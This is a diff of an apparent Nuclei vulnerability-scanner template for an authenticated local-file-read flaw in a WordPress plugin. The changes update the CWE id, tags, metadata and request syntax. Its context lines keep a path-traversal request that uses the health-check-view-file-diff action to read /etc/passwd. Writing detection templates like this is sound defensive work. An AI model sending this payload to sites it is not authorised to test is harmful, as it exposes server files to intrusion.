@@ -12,10 +12,12 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
-    cwe-id: CWE-22
-  tags: lfi,wp,wordpress,wp-plugin,authenticated,lfr
+    cwe-id: CWE-23
+  metadata:
+    max-request: 2
+  tags: lfi,wp,wordpress,wp-plugin,authenticated,lfr,wpscan,vuln
 
-requests:
+http:
   - raw:
       - |
         POST /wp-login.php HTTP/1.1
@@ -31,7 +33,6 @@ requests:
 
         action=health-check-view-file-diff&file=../../../../../../etc/passwd
 
-    cookie-reuse: true
     matchers-condition: and
     matchers:
       - type: regex
@@ -47,5 +48,4 @@ requests:
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/08/05
+# digest: 4a0a0047304502210081d05dddb7a9e80d70be70b915422f8f14f6a8e2aa0e4be51aaaa641fcddc1dd02202cb09168e2d0e67d12c3f6373d9704827ada152cfff31a34728d2cd9f6e83798:922c64590222798bb761d5b6d8e72950
